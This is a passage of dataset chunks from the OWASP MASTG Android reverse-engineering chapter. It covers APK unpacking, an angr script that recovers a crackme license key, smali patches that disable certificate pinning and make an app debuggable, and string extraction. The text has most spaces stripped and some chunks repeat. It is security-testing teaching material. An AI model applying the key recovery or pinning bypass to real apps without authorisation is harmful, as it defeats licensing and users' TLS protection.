Next,youhavetoaddpath/to/android/sdk/extras/google/instantapps/iatoyour$PATH. Afterthepreparation, youcantestinstantappslocallyonadevicerunningAndroid8.1(APIlevel27)orlater. Theapp canbetestedindifferentways: • Testtheapplocally: DeploytheappviaAndroidStudio(andenabletheDeploy as instant appcheckboxinthe Run/Configurationdialog)ordeploytheappusingthefollowingcommand: iarun output-from-build-command <app-artifact> • TesttheappusingthePlayConsole: 1. UploadyourAppBundletotheGooglePlayConsole 2. Preparetheuploadedbundleforareleasetotheinternaltesttrack. 3. Signintoaninternaltesteraccountonadevice,thenlaunchyourinstantexperiencefromeitheranexternal preparedlinkorviathetry nowbuttonintheAppstorefromthetestersaccount. Nowthatyoucantesttheapp,checkwhether: • Thereareanydatawhichrequireprivacycontrolsandwhetherthesecontrolsareinplace. • Allcommunicationsaresufficientlysecured. • Whenyouneedmorefunctionalities,aretherightsecuritycontrolsdownloadedaswellforthesefunctionalities? Exploring the App Package Platform: android Onceyouhavecollectedthepackagenameoftheapplicationyouwanttotarget,you’llwanttostartgatheringinformation aboutit. First,retrievetheAPKasexplainedin“BasicTestingOperations-ObtainingandExtractingApps”. APK files are actually ZIP files that can be unpacked using a standard decompression utility such as unzip. However, we recommend using apktool which additionally decodes the AndroidManifest.xml and disassembles the app binaries (classes.dex)tosmalicode: $apktooldUnCrackable-Level3.apk $tree . ├──AndroidManifest.xml ├──apktool.yml ├──lib ├──original │ ├──AndroidManifest.xml │ └──META-INF │ ├──CERT.RSA │ ├──CERT.SF 113\\n│ └──MANIFEST.MF ├──res ... └──smali Thefollowingfilesareunpacked: • AndroidManifest.xml: containsthedefinitionoftheapp’spackagename, targetandminimumAPIlevel,appcon- figuration,appcomponents,permissions,etc. • original/META-INF:containstheapp’smetadata – MANIFEST.MF:storeshashesoftheappresources – CERT.RSA:theapp’scertificate(s) – CERT.SF:listofresourcesandtheSHA-1digestofthecorrespondinglinesintheMANIFEST.MFfile • assets: directorycontainingappassets(filesusedwithintheAndroidapp,suchasXMLfiles,JavaScriptfiles,and pictures),whichtheAssetManagercanretrieve • classes.dex: classescompiledintheDEXfileformat,thatDalvikvirtualmachine/AndroidRuntimecanprocess. DEX isJavabytecodefortheDalvikVirtualMachine. Itisoptimizedforsmalldevices • lib: directorycontaining3rdpartylibrariesthatarepartoftheAPK • res: directorycontainingresourcesthathaven’tbeencompiledintoresources.arsc • resources.arsc: filecontainingprecompiledresources,suchasXMLfilesforthelayout AsunzippingwiththestandardunziputilityleavessomefilessuchastheAndroidManifest.xmlunreadable,it’sbetter tounpacktheAPKusingapktool. $ls -alh total32 drwxr-xr-x 9sven staff 306BDec 516:29. drwxr-xr-x 5sven staff 170BDec 516:29.. -rw-r--r-- 1sven staff 10KDec 516:29AndroidManifest.xml -rw-r--r-- 1sven staff 401BDec 516:29apktool.yml drwxr-xr-x 6sven staff 204BDec 516:29assets drwxr-xr-x 3sven staff 102BDec 516:29lib drwxr-xr-x 4sven staff 136BDec 516:29original drwxr-xr-x 131sven staff 4.3KDec 516:29res drwxr-xr-x 9sven staff 306BDec 516:29smali The Android Manifest TheAndroidManifestisthemainsourceofinformation, itincludesalotofinterestinginformationsuchasthepackage name,thepermissions,appcomponents,etc. Here’sanon-exhaustivelistofsomeinfoandthecorrespondingkeywordsthatyoucaneasilysearchforintheAndroid Manifestbyjustinspectingthefileorbyusinggrep -i <keyword> AndroidManifest.xml: • Apppermissions: permission(see“AndroidPlatformAPIs”) • Backupallowance: android:allowBackup(see“DataStorageonAndroid •",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 62
    }
  },
  {
    "text": "10KDec 516:29AndroidManifest.xml -rw-r--r-- 1sven staff 401BDec 516:29apktool.yml drwxr-xr-x 6sven staff 204BDec 516:29assets drwxr-xr-x 3sven staff 102BDec 516:29lib drwxr-xr-x 4sven staff 136BDec 516:29original drwxr-xr-x 131sven staff 4.3KDec 516:29res drwxr-xr-x 9sven staff 306BDec 516:29smali The Android Manifest TheAndroidManifestisthemainsourceofinformation, itincludesalotofinterestinginformationsuchasthepackage name,thepermissions,appcomponents,etc. Here’sanon-exhaustivelistofsomeinfoandthecorrespondingkeywordsthatyoucaneasilysearchforintheAndroid Manifestbyjustinspectingthefileorbyusinggrep -i <keyword> AndroidManifest.xml: • Apppermissions: permission(see“AndroidPlatformAPIs”) • Backupallowance: android:allowBackup(see“DataStorageonAndroid • App components: activity, service, provider, receiver (see “Android Platform APIs” and “Data Storage on Android • Debuggableflag: debuggable(see“CodeQualityandBuildSettingsofAndroidApps”) Pleaserefertothementionedchapterstolearnmoreabouthowtotesteachofthesepoints. App Binary Theappbinary(classes.dex)canbefoundintherootdirectoryoftheapppackage. Itisaso-calledDEX(DalvikExe- cutable)filethatcontainscompiledJavacode. Duetoitsnature,afterapplyingsomeconversionsyou’llbeabletousea decompilertoproduceJavacode. We’vealsoseenthefoldersmalithatwasobtainedafterwerunapktool. Thiscontains thedisassembledDalvikbytecodeinanintermediatelanguagecalledsmali, whichisahuman-readablerepresentation oftheDalvikexecutable. Refertothesection“ReviewingDecompiledJavaCode”inthechapter“TamperingandReverseEngineeringonAndroid” formoreinformationabouthowtoreverseengineerDEXfiles. 114\\nCompiled App Binary Insomecasesitmightbeusefultoretrievethecompiledappbinary(.odex). Firstgetthepathtotheapp’sdatadirectory: adbshellpmpathcom.example.myapplication package:/data/app/~~DEMFPZh7R4qfUwwwh1czYA==/com.example.myapplication-pOslqiQkJclb_1Vk9-WAXg==/base.apk Remove the /base.apk part, add /oat/arm64/base.odex and use the resulting path to pull the base.odex from the device: adbroot adbpull/data/app/~~DEMFPZh7R4qfUwwwh1czYA==/com.example.myapplication-pOslqiQkJclb_1Vk9-WAXg==/oat/arm64/base.odex NotethattheexactdirectorywillbedifferentbasedonyourAndroidversion. Ifthe/oat/arm64/base.odexfilecan’tbe found,manuallysearchinthedirectoryreturnedbypm path. Native Libraries YoucaninspectthelibfolderintheAPK: $ls -1lib/armeabi/ libdatabase_sqlcipher.so libnative.so libsqlcipher_android.so libstlport_shared.so orfromthedevicewithobjection: ...g.vp.owasp_mobile.omtg_androidon (google:8.1.0)[usb] #lslib Type ... Name ------ ... ------------------------ File ... libnative.so File ... libdatabase_sqlcipher.so File ... libstlport_shared.so File ... libsqlcipher_android.so For now this is all information you can get about the native libraries unless you start reverse engineering them, which isdoneusingadifferentapproachthantheoneusedtoreversetheappbinaryasthiscodecannotbedecompiledbut only disassembled. Refer to the section “Reviewing Disassemble Native Code” in the chapter “Tampering and Reverse EngineeringonAndroid”formoreinformationabouthowtoreverseengineertheselibraries. Other App Resources ItisnormallyworthtakingalookattherestoftheresourcesandfilesthatyoumayfindintherootfolderoftheAPKas sometimestheycontainadditionalgoodieslikekeystores,encrypteddatabases,certificates,etc. Symbolic Execution Platform: android Symbolicexecutionisaveryusefultechniquetohaveinyourtoolbox,especiallywhiledealingwithproblemswhereyou needtofindacorrectinputforreachingacertainblockofcode. Inthissection,wewillsolveasimpleAndroidcrackme byusingtheAngrbinaryanalysisframeworkasoursymbolicexecutionengine. Todemonstratethistechniquewe’lluseacrackmecalledAndroidLicenseValidator. ThecrackmeconsistsofasingleELF executablefile,whichcanbeexecutedonanyAndroiddevicebyfollowingtheinstructionsbelow: 115\\n$adbpushvalidate/data/local/tmp [100%]/data/local/tmp/validate $adbshellchmod755/data/local/tmp/validate $adbshell/data/local/tmp/validate Usage:./validate <serial> $adbshell/data/local/tmp/validate12345 Incorrectserial (wrongformat). Sofarsogood,butweknownothingaboutwhatavalidlicensekeylookslike. Togetstarted,opentheELFexecutable inadisassemblersuchasiaito. Themainfunctionislocatedatoffset0x00001874inthedisassembly. Itisimportantto notethatthisbinaryisPIE-enabled,andiaitochoosestoloadthebinaryat0x0asimagebaseaddress. 116\\nThefunctionnameshavebeenstrippedfromthebinary,butluckilythereareenoughdebuggingstringstoprovideusa contexttothecode. Movingforward,wewillstartanalyzingthebinaryfromtheentryfunctionatoffset0x00001874,and keepanoteofalltheinformationeasilyavailabletous. Duringthisanalysis,wewillalsotrytoidentifythecoderegions whicharesuitableforsymbolicexecution. 117\\nstrleniscalledatoffset0x000018a8, andthereturnedvalueiscomparedto0x10atoffset0x000018b0. Immediately afterthat,theinputstringispassedtoaBase32decodingfunctionatoffset0x00001340. Thisprovidesuswithvaluable informationthattheinputlicensekeyisaBase32-encoded16-characterstring(whichtotals10bytesinraw). Thedecoded inputisthenpassedtothefunctionatoffset0x00001760,whichvalidatesthelicensekey. Thedisassemblyofthisfunction isshownbelow. Wecannowusethisinformationabouttheexpectedinputtofurtherlookintothevalidationfunctionat0x00001760. ╭(fcn)fcn.00001760 268 │ fcn.00001760 (int32_targ1); │ ;varint32_tvar_20h@fp-0x20 │ ;varint32_tvar_14h@fp-0x14 │ ;varint32_tvar_10h@fp-0x10 │ ;argint32_targ1@r0 │ ;CALLXREFfromfcn.00001760(+0x1c4) │ 0x00001760 push {r4,fp,lr} │ 0x00001764 addfp,sp,8 │ 0x00001768 subsp,sp,0x1c │ 0x0000176c strr0,[var_20h] ;0x20;\"$!\";arg1 │ 0x00001770 ldrr3,[var_20h] ;0x20;\"$!\";entry.preinit0 │ 0x00001774 strr3,[var_10h] ;str. │ ;0x10 │ 0x00001778 movr3,0 │ 0x0000177c strr3,[var_14h] ;0x14 │ ╭─<0x00001780 b0x17d0 │ │ ;CODEXREFfromfcn.00001760(0x17d8) │ ╭──>0x00001784 ldrr3,[var_10h] ;str. │ │ ;0x10;entry.preinit0 │ ╎│ 0x00001788 ldrbr2,[r3] │ ╎│ 0x0000178c ldrr3,[var_10h] ;str. │ ╎│ ;0x10;entry.preinit0 │ ╎│ 0x00001790 addr3,r3,1 │ ╎│ 0x00001794 ldrbr3,[r3] │ ╎│ 0x00001798 eorr3,r2,r3 │ ╎│ 0x0000179c andr2,r3,0xff │ ╎│ 0x000017a0 mvnr3,0xf │ ╎│ 0x000017a4 ldrr1,[var_14h] ;0x14;entry.preinit0 │ ╎│ 0x000017a8 subr0,fp,0xc │ ╎│ 0x000017ac addr1,r0,r1 │ ╎│ 0x000017b0 addr3,r1,r3 118\\n│ ╎│ 0x000017b4 strbr2,[r3] │ ╎│ 0x000017b8 ldrr3,[var_10h] ;str. │ ╎│ ;0x10;entry.preinit0 │ ╎│ 0x000017bc addr3,r3,2 ;\"ELF\\x01\\x01\\x01\";aav.0x00000001 │ ╎│ 0x000017c0 strr3,[var_10h] ;str. │ ╎│ ;0x10 │ ╎│ 0x000017c4 ldrr3,[var_14h] ;0x14;entry.preinit0 │ ╎│ 0x000017c8 addr3,r3,1 │ ╎│ 0x000017cc strr3,[var_14h] ;0x14 │ ╎│ ;CODEXREFfromfcn.00001760(0x1780) │ ╎╰─>0x000017d0 ldrr3,[var_14h] ;0x14;entry.preinit0 │ ╎ 0x000017d4 cmpr3,4 ;aav.0x00000004;aav.0x00000001;aav.0x00000001 │ ╰──<0x000017d8 ble0x1784 ;likely │ 0x000017dc ldrbr4,[fp,-0x1c] ;\"4\" │ 0x000017e0 blfcn.000016f0 │ 0x000017e4 movr3,r0 │ 0x000017e8 cmpr4,r3 │ ╭─<0x000017ec bne0x1854 ;likely │ │ 0x000017f0 ldrbr4,[fp,-0x1b] │ │ 0x000017f4 blfcn.0000170c │ │ 0x000017f8 movr3,r0 │ │ 0x000017fc cmpr4,r3 │ ╭──<0x00001800 bne0x1854 ;likely │ ││ 0x00001804 ldrbr4,[fp,-0x1a] │ ││ 0x00001808 blfcn.000016f0 │ ││ 0x0000180c movr3,r0 │ ││ 0x00001810 cmpr4,r3 │ ╭───<0x00001814 bne0x1854 ;likely │ │││ 0x00001818 ldrbr4,[fp,-0x19] │ │││ 0x0000181c blfcn.00001728 │ │││ 0x00001820 movr3,r0 │ │││ 0x00001824 cmpr4,r3 │ ╭────<0x00001828 bne0x1854 ;likely │ ││││ 0x0000182c ldrbr4,[fp,-0x18] │ ││││ 0x00001830 blfcn.00001744 │ ││││ 0x00001834 movr3,r0 │ ││││ 0x00001838 cmpr4,r3 │ ╭─────<0x0000183c bne0x1854 ;likely │ │││││ 0x00001840 ldrr3,[0x0000186c] ;[0x186c:4]=0x270section..hash;section..hash │ │││││ 0x00001844 addr3,pc,r3",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 63
    }
  },
  {
    "text": ";likely │ │││ 0x00001818 ldrbr4,[fp,-0x19] │ │││ 0x0000181c blfcn.00001728 │ │││ 0x00001820 movr3,r0 │ │││ 0x00001824 cmpr4,r3 │ ╭────<0x00001828 bne0x1854 ;likely │ ││││ 0x0000182c ldrbr4,[fp,-0x18] │ ││││ 0x00001830 blfcn.00001744 │ ││││ 0x00001834 movr3,r0 │ ││││ 0x00001838 cmpr4,r3 │ ╭─────<0x0000183c bne0x1854 ;likely │ │││││ 0x00001840 ldrr3,[0x0000186c] ;[0x186c:4]=0x270section..hash;section..hash │ │││││ 0x00001844 addr3,pc,r3 ;0x1abc;\"Productactivationpassed.Congratulations!\" │ │││││ 0x00001848 movr0,r3 ;0x1abc;\"Productactivationpassed.Congratulations!\"; │ │││││ 0x0000184c blsym.imp.puts ;intputs(constchar*s) │ │││││ ;intputs(\"Productactivationpassed.Congratulations!\") │ ╭──────<0x00001850 b0x1864 │ ││││││ ;CODEXREFSfromfcn.00001760(0x17ec,0x1800,0x1814,0x1828,0x183c) │ │╰╰╰╰╰─>0x00001854 ldrr3,aav.0x00000288 ;[0x1870:4]=0x288aav.0x00000288 │ │ 0x00001858 addr3,pc,r3 ;0x1ae8;\"Incorrectserial.\"; │ │ 0x0000185c movr0,r3 ;0x1ae8;\"Incorrectserial.\"; │ │ 0x00001860 blsym.imp.puts ;intputs(constchar*s) │ │ ;intputs(\"Incorrectserial.\") │ │ ;CODEXREFfromfcn.00001760(0x1850) │ ╰──────>0x00001864 subsp,fp,8 ╰ 0x00001868 pop{r4,fp,pc} ;entry.preinit0;entry.preinit0; Discussingalltheinstructionsinthefunctionisbeyondthescopeofthischapter,insteadwewilldiscussonlytheimportant pointsneededfortheanalysis. Inthevalidationfunction, thereisalooppresentat0x00001784whichperformsaXOR operationatoffset0x00001798. Theloopismoreclearlyvisibleinthegraphviewbelow. 119\\nXORisaverycommonlyusedtechniquetoencryptinformationwhereobfuscationisthegoalratherthansecurity. XOR shouldnotbeusedforanyseriousencryption,asitcanbecrackedusingfrequencyanalysis. Therefore,themere presenceofXORencryptioninsuchavalidationlogicalwaysrequiresspecialattentionandanalysis. Movingforward,atoffset0x000017dc,theXORdecodedvalueobtainedfromaboveisbeingcomparedagainstthereturn valuefromasub-functioncallat0x000017e8. Clearlythisfunctionisnotcomplex,andcanbeanalyzedmanually,butstillremainsacumbersometask. Especiallywhile 120\\nworking on a big code base, time can be a major constraint, and it is desirable to automate such analysis. Dynamic symbolic execution is helpful in exactly those situations. In the above crackme, the symbolic execution engine can determinetheconstraintsoneachbyteoftheinputstringbymappingapathbetweenthefirstinstructionofthelicense check(at0x00001760)andthecodethatprintsthe“Productactivationpassed”message(at0x00001840). Theconstraintsobtainedfromtheabovestepsarepassedtoasolverengine,whichfindsaninputthatsatisfiesthem-a validlicensekey. YouneedtoperformseveralstepstoinitializeAngr’ssymbolicexecutionengine: • LoadthebinaryintoaProject,whichisthestartingpointforanykindofanalysisinAngr. • Passtheaddressfromwhichtheanalysisshouldstart. Inthiscase,wewillinitializethestatewiththefirstinstruction oftheserialvalidationfunction. Thismakestheproblemsignificantlyeasiertosolvebecauseyouavoidsymbolically executingtheBase32implementation. • Passtheaddressofthecodeblockthattheanalysisshouldreach. Inthiscase,that’stheoffset0x00001840,where thecoderesponsibleforprintingthe“Productactivationpassed”messageislocated. • Also,specifytheaddressesthattheanalysisshouldnotreach. Inthiscase,thecodeblockthatprintsthe“Incorrect serial”messageat0x00001854isnotinteresting. NotethattheAngrloaderwillloadthePIEexecutablewithabaseaddressof0x400000,whichneedstobeadded totheoffsetsfromiaitobeforepassingittoAngr. Thefinalsolutionscriptispresentedbelow: importangr #Version:9.2.2 importbase64 load_options ={} b=angr.Project(\"./validate\",load_options =load_options) ##Thekeyvalidationfunctionstartsat0x401760,sothat'swherewecreatetheinitialstate. ##Thisspeedsthingsupalotbecausewe'rebypassingtheBase32-encoder. options ={ angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS, } state =b.factory.blank_state(addr=0x401760,add_options=options) simgr =b.factory.simulation_manager(state) simgr.explore(find=0x401840,avoid=0x401854) ##0x401840=Productactivationpassed ##0x401854=Incorrectserial found =simgr.found[0] ##Getthesolutionstringfrom*(R11-0x20). addr =found.memory.load(found.regs.r11 -0x20,1,endness=\"Iend_LE\") concrete_addr =found.solver.eval(addr) solution =found.solver.eval(found.memory.load(concrete_addr,10),cast_to=bytes) print(base64.b32encode(solution)) 121\\nAs discussed previously in the section “Dynamic Binary Instrumentation”, the symbolic execution engine constructs a binary tree of the operations for the program input given and generates a mathematical equation for each possible paththatmightbetaken. Internally,Angrexploresallthepathsbetweenthetwopointsspecifiedbyus,andpassesthe correspondingmathematicalequationstothesolvertoreturnmeaningfulconcreteresults. Wecanaccessthesesolutions viasimulation_manager.foundlist,whichcontainsallthepossiblepathsexploredbyAngrwhichsatisfiesourspecified searchcriteria. Take a closer look at the latter part of the script where the final solution string is being retrieved. The address of the string is obtained from address r11 - 0x20. This may appear magical at first, but a careful analysis of the function at 0x00001760holdstheclue,asitdeterminesifthegiveninputstringisavalidlicensekeyornot. Inthedisassemblyabove, youcanseehowtheinputstringtothefunction(inregisterR0)isstoredintoalocalstackvariable0x0000176c str r0,[var_20h]. Hence,wedecidedtousethisvaluetoretrievethefinalsolutioninthescript. Usingfound.solver.eval youcanaskthesolverquestionslike“giventheoutputofthissequenceofoperations(thecurrentstateinfound),what musttheinput(ataddr)havebeen?”. InARMv7,R11iscalledfp(functionpointer),thereforeR11 - 0x20isequivalenttofp-0x20: var int32_t var_20h @ fp-0x20 Next,theendnessparameterinthescriptspecifiesthatthedataisstoredin“little-endian”fashion,whichisthecasefor almostalloftheAndroiddevices. Also, it may appear as if the script is simply reading the solution string from the memory of the script. However, it’s readingitfromthesymbolicmemory. Neitherthestringnorthepointertothestringactuallyexist. Thesolverensures thatthesolutionitprovidesisthesameasiftheprogramwouldbeexecutedtothatpoint. Runningthisscriptshouldreturnthefollowingoutput: $python3solve.py WARNING |...|cle.loader |Themainbinaryisaposition-independentexecutable.Itisbeingloadedwithabaseaddressof0x400000. b'JACE6ACIARNAAIIA' NowyoucanrunthevalidatebinaryinyourAndroiddevicetoverifythesolutionasindicatedhere. Youmayobtaindifferentsolutionsusingthescript,astherearemultiplevalidlicensekeyspossible. To conclude, learning symbolic execution might look a bit intimidating at first, as it requires deep understanding and extensive practice. However, the effort is justified considering the valuable time it can save in contrast to analyzing complexdisassembledinstructionsmanually. Typicallyyou’dusehybridtechniques,asintheaboveexample,wherewe performed manual analysis of the disassembled code to provide the correct criteria to the symbolic execution engine. PleaserefertotheiOSchapterformoreexamplesonAngrusage. Patching Platform: android MakingsmallchangestotheAndroidManifestorbytecodeisoftenthequickestwaytofixsmallannoyancesthatprevent youfromtestingorreverseengineeringanapp. OnAndroid,twoissuesinparticularhappenregularly: 1. Youcan’tinterceptHTTPStrafficwithaproxybecausetheappemploysSSLpinning. 2. Youcan’tattachadebuggertotheappbecausetheandroid:debuggableflagisnotsetto\"true\"intheAndroid Manifest. In most cases, both issues can be fixed by making minor changes to the app (aka. patching) and then re-signing and repackagingit. AppsthatrunadditionalintegritychecksbeyonddefaultAndroidcode-signingareanexception. Inthose cases,youhavetopatchtheadditionalchecksaswell. ThefirststepisunpackinganddisassemblingtheAPKwithapktool: 122\\napktooldtarget_apk.apk Note: To save time, you may use the flag --no-src if you only want to unpack the APK but not disassemble the code. Forexample,whenyouonlywanttomodifytheAndroidManifestandrepackimmediately. Patching Example: Disabling Certificate Pinning Certificate pinning is an issue for security testers who want to intercept HTTPS communication for legitimate reasons. PatchingbytecodetodeactivateSSLpinningcanhelpwiththis. Todemonstratebypassingcertificatepinning,we’llwalk throughanimplementationinanexampleapplication. Onceyou’veunpackedanddisassembledtheAPK,it’stimetofindthecertificatepinningchecksintheSmalisourcecode. Searchingthecodeforkeywordssuchas“X509TrustManager”shouldpointyouintherightdirection. Inourexample,asearchfor“X509TrustManager”returnsoneclassthatimplementsacustomTrustManager. Thederived classimplementsthemethodscheckClientTrusted,checkServerTrusted,andgetAcceptedIssuers. To bypass the pinning",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 64
    }
  },
  {
    "text": "flag --no-src if you only want to unpack the APK but not disassemble the code. Forexample,whenyouonlywanttomodifytheAndroidManifestandrepackimmediately. Patching Example: Disabling Certificate Pinning Certificate pinning is an issue for security testers who want to intercept HTTPS communication for legitimate reasons. PatchingbytecodetodeactivateSSLpinningcanhelpwiththis. Todemonstratebypassingcertificatepinning,we’llwalk throughanimplementationinanexampleapplication. Onceyou’veunpackedanddisassembledtheAPK,it’stimetofindthecertificatepinningchecksintheSmalisourcecode. Searchingthecodeforkeywordssuchas“X509TrustManager”shouldpointyouintherightdirection. Inourexample,asearchfor“X509TrustManager”returnsoneclassthatimplementsacustomTrustManager. Thederived classimplementsthemethodscheckClientTrusted,checkServerTrusted,andgetAcceptedIssuers. To bypass the pinning check, add the return-void opcode to the first line of each method. This opcode causes the checkstoreturnimmediately. Withthismodification,nocertificatechecksareperformed,andtheapplicationacceptsall certificates. .methodpubliccheckServerTrusted([LJava/security/cert/X509Certificate;Ljava/lang/String;)V .locals3 .paramp1,\"chain\" #[Ljava/security/cert/X509Certificate; .paramp2,\"authType\" #Ljava/lang/String; .prologue return-void #<--OURINSERTEDOPCODE! .line102 iget-objectv1,p0,Lasdf/t$a;->a:Ljava/util/ArrayList; invoke-virtual{v1},Ljava/util/ArrayList;->iterator()Ljava/util/Iterator; move-result-objectv1 :goto_0 invoke-interface{v1},Ljava/util/Iterator;->hasNext()Z This modification will break the APK signature, so you’ll also have to re-sign the altered APK archive after repackaging it. Patching Example: Making an App Debuggable Every debugger-enabled process runs an extra thread for handling JDWP protocol packets. This thread is started only forappsthathavetheandroid:debuggable=\"true\"flagsetintheirmanifestfile’s<application>element. Thisisthe typicalconfigurationofAndroiddevicesshippedtoendusers. When reverse engineering apps, you’ll often have access to the target app’s release build only. Release builds aren’t meanttobedebugged,that’sthepurposeofdebugbuilds. Ifthesystempropertyro.debuggableissetto“0”,Android disallowsbothJDWPandnativedebuggingofreleasebuilds. Althoughthisiseasytobypass,you’restilllikelytoencounter limitations,suchasalackoflinebreakpoints. Nevertheless,evenanimperfectdebuggerisstillaninvaluabletool,being abletoinspecttheruntimestateofaprogrammakesunderstandingtheprogramaloteasier. Toconvert areleasebuildintoadebuggablebuild, youneedtomodifyaflagintheAndroidManifestfile(AndroidMani- fest.xml). Onceyou’veunpackedtheapp(e.g.apktoold--no-srcUnCrackable-Level1.apk)anddecodedtheAndroid Manifest,addandroid:debuggable=\"true\"toitusingatexteditor: <application android:allowBackup=\"true\" android:debuggable=\"true\" android:icon=\"@drawable/ic_launcher\" android:label=\"@string/app_name\" ↪ android:name=\"com.xxx.xxx.xxx\" android:theme=\"@style/AppTheme\"> Evenifwehaven’talteredthesourcecode,thismodificationalsobreakstheAPKsignature,soyou’llalsohavetore-sign thealteredAPKarchive. 123\\nPatching React Native applications IftheReactNativeframeworkhasbeenusedfordevelopingthenthemainapplicationcodeislocatedinthefileassets/ index.android.bundle. ThisfilecontainstheJavaScriptcode. Mostofthetime,theJavaScriptcodeinthisfileisminified. ByusingthetoolJStilleryahumanreadableversionofthefilecanberetrieved,allowingcodeanalysis. TheCLIversion ofJStilleryorthelocalservershouldbepreferredinsteadofusingtheonlineversionasotherwisesourcecodeissentand disclosedtoa3rdparty. ThefollowingapproachcanbeusedinordertopatchtheJavaScriptfile: 1. UnpacktheAPKarchiveusingapktooltool. 2. Copythecontentofthefileassets/index.android.bundleintoatemporaryfile. 3. UseJStillerytobeautifyanddeobfuscatethecontentofthetemporaryfile. 4. Identifywherethecodeshouldbepatchedinthetemporaryfileandimplementthechanges. 5. Putthepatchedcodeonasinglelineandcopyitintheoriginalassets/index.android.bundlefile. 6. RepacktheAPKarchiveusingapktooltoolandsignitbeforeinstallingitonthetargetdevice/emulator. Retrieving Strings Platform: android While performing any kind of binary analysis, strings can be considered as one of the most valuable starting points as they provide context. For example, an error log string like “Data encryption failed.” gives us a hint that the adjoining codemightberesponsibleforperformingsomekindofencryptionoperation. Java and Kotlin Bytecode As we already know, all the Java and Kotlin bytecode of an Android application is compiled into a DEX file. Each DEX filecontainsalistofstringidentifiers(strings_ids),whichcontainsallthestringidentifiersusedinthebinarywhenevera stringisreferred,includinginternalnaming(e.g,typedescriptors)orconstantobjectsreferredbythecode(e.ghardcoded strings). YoucansimplydumpthislistusingtoolssuchasGhidra(GUIbased)orDextra(CLIbased). With Ghidra, strings can be obtained by simply loading the DEX file and selectingWindow -> Defined strings in the menu. LoadinganAPKfiledirectlyintoGhidramightleadtoinconsistencies. ThusitisrecommendedtoextracttheDEX filebyunzippingtheAPKfileandthenloadingitintoGhidra. 124\\nWithDextra,youcandumpallthestringsusingthefollowingcommand: dextra -Sclasses.dex TheoutputfromDextracanbemanipulatedusingstandardLinuxcommands,forexample,usinggreptosearchforcertain keywords. Itisimportanttoknow,thelistofstringsobtainedusingtheabovetoolscanbeverybig,asitalsoincludesthevarious classandpackagenamesusedintheapplication. Goingthroughthecompletelist,speciallyforbigbinaries,canbevery cumbersome. Thus,itisrecommendedtostartwithkeyword-basedsearchingandgothroughthelistonlywhenkeyword searchdoesnothelp. Somegenerickeywordswhichcanbeagoodstartingpointare-password,key,andsecret. Other usefulkeywordsspecifictothecontextoftheappcanbeobtainedwhileyouareusingtheappitself. Forinstance,imagine thattheapphasasloginform,youcantakenoteofthedisplayedplaceholderortitletextoftheinputfieldsandusethat asanentrypointforyourstaticanalysis. Native Code In order to extract strings from native code used in an Android application, you can use GUI tools such as Ghidra or iaitoorrelyonCLI-basedtoolssuchasthestringsUnixutility(strings <path_to_binary>)orradare2’srabin2(rabin2 -zz <path_to_binary>). When using the CLI-based ones you can take advantage of other tools such as grep (e.g. in conjunctionwithregularexpressions)tofurtherfilterandanalyzetheresults. Accessing App Data Directories 125\\nPlatform: android Onceyouhaveinstalledtheapp,thereisfurtherinformationtoexplore,wheretoolslikeobjectioncomeinhandy. Whenusingobjectionyoucanretrievedifferentkindsofinformation,whereenvwillshowyouallthedirectoryinformation oftheapp. $objection -gsg.vp.owasp_mobile.omtg_androidexplore ...g.vp.owasp_mobile.omtg_androidon (google:8.1.0)[usb] #env Name Path ---------------------- --------------------------------------------------------------------------- cacheDirectory /data/user/0/sg.vp.owasp_mobile.omtg_android/cache codeCacheDirectory /data/user/0/sg.vp.owasp_mobile.omtg_android/code_cache externalCacheDirectory /storage/emulated/0/Android/data/sg.vp.owasp_mobile.omtg_android/cache filesDirectory /data/user/0/sg.vp.owasp_mobile.omtg_android/files obbDir /storage/emulated/0/Android/obb/sg.vp.owasp_mobile.omtg_android packageCodePath /data/app/sg.vp.owasp_mobile.omtg_android-kR0ovWl9eoU_yh0jPJ9caQ==/base.apk Amongthisinformationwefind: • Theinternaldatadirectory(aka. sandboxdirectory)whichisat/data/data/[package-name]or/data/user/0/[ package-name] • Theexternaldatadirectoryat/storage/emulated/0/Android/data/[package-name]or/sdcard/Android/data/ [package-name] • Thepathtotheapppackagein/data/app/ Theinternaldatadirectoryisusedbytheapptostoredatacreatedduringruntimeandhasthefollowingbasicstructure: ...g.vp.owasp_mobile.omtg_androidon (google:8.1.0) [usb] #ls Type ... Name --------- ... ------------------- Directory ... cache Directory ... code_cache Directory ... lib Directory ... shared_prefs Directory ... files Directory ... databases Readable:True Writable:True Eachfolderhasitsownpurpose: • cache: Thislocationisusedfordatacaching. Forexample,theWebViewcacheisfoundinthisdirectory. • code_cache:Thisisthelocationofthefilesystem’sapplication-specificcachedirectorydesignedforstoringcached code. OndevicesrunningAndroid5.0(APIlevel21)orlater,thesystemwilldeleteanyfilesstoredinthislocation whentheapportheentireplatformisupgraded. • lib: This folder stores native libraries written in C/C++. These libraries can have one of several file extensions, including.soand.dll(x86support). Thisfoldercontainssubdirectoriesfortheplatformstheapphasnativelibraries for,including – armeabi: compiledcodeforallARM-basedprocessors – armeabi-v7a: compiledcodeforallARM-basedprocessors,version7andaboveonly – arm64-v8a: compiledcodeforall64-bitARM-basedprocessors,version8andabovebasedonly – x86: compiledcodeforx86processorsonly – x86_64: compiledcodeforx86_64processorsonly – mips: compiledcodeforMIPSprocessors • shared_prefs: ThisfoldercontainsanXMLfilethatstoresvaluessavedviatheSharedPreferencesAPIs. • files: Thisfolderstoresregularfilescreatedbytheapp. • databases: ThisfolderstoresSQLitedatabasefilesgeneratedbytheappatruntime,e.g.,userdatafiles. However,theappmightstoremoredatanotonlyinsidethesefoldersbutalsointheparentfolder(/data/data/[package- name]). Refertothe“TestingDataStorage”chapterformoreinformationandbestpracticesonsecurelystoringsensitivedata. 126\\nDynamic Analysis on Non-Rooted Devices Platform: android Non-rooteddeviceshavethebenefitofreplicatinganenvironmentthattheapplicationisintendedtorunon. Thankstotoolslikeobjection,youcanpatchtheappinordertotestitlikeifyouwereonarooteddevice(butofcourse being",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 65
    }
  },
  {
